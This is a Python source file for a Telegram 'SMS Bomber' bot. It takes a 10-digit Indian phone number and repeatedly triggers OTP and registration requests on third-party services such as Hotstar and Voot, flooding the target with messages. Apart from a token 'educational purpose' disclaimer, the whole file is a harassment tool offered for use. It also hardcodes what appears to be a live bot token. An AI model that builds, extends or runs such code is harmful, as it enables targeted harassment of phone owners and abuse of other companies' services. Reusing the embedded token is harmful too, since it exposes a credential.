import os
import random
import requests
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Telegram Bot Token (Railway Variables se lega) ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')

# --- SMS Bombing Functions (APIs) ---
def get_apis(target):
    """SMS bhejne ke liye API endpoints"""
    apis = [
        {
            'url': 'https://api.hotstar.com/um/v3/users/.../register?register-by=phone_otp',
            'method': 'PUT',
            'headers': {'Content-Type': 'application/json'},
            'data': {"phone_number": target, "country_prefix": "91"}
        },
        {
            'url': 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
            'method': 'POST',
            'headers': {'Content-Type': 'application/json'},
            'data': {"type": "mobile", "mobile": target, "countryCode": "+91"}
        },
        # Aur bhi APIs add kar sakte hain
    ]
    return apis

def send_sms(api_data):
    """Single SMS send karein"""
    try:
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=api_data['headers'], timeout=10)
        else:
            response = requests.post(api_data['url'], headers=api_data['headers'], json=api_data['data'], timeout=10)
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start command handler"""
    await update.message.reply_text(
        "🚀 *SMS Bomber Bot Activated!*\n\n"
        "Send me a 10-digit phone number to start bombing.\n"
        "Example: `9876543210`\n\n"
        "⚠️ *For Educational Purpose Only*",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number and start bombing"""
    phone = update.message.text.strip()
    
    # Validate phone number
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid number! Please send a 10-digit number.")
        return
    
    # Send initial response
    msg = await update.message.reply_text(f"📱 *Bombing started on +91{phone}*\n⏳ Sending messages...", parse_mode='Markdown')
    
    # Start bombing
    count = 0
    apis = get_apis(phone)
    random.shuffle(apis)
    
    for api in apis[:15]:  # Max 15 requests per command
        if send_sms(api):
            count += 1
    
    await msg.edit_text(
        f"✅ *Bombing Complete!*\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Messages Sent: {count}\n\n"
        f"Send another number to continue.",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/help command handler"""
    await update.message.reply_text(
        "🤖 *How to use:*\n"
        "1. Send a 10-digit phone number.\n"
        "2. Wait for bot to finish.\n"
        "3. Send another number.\n\n"
        "📌 *Commands:*\n"
        "/start - Start bot\n"
        "/help - Help menu",
        parse_mode='Markdown'
    )

def main():
    """Main bot runner"""
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("🤖 Bot started polling...")
    app.run_polling()

if __name__ == '__main__':
    main()
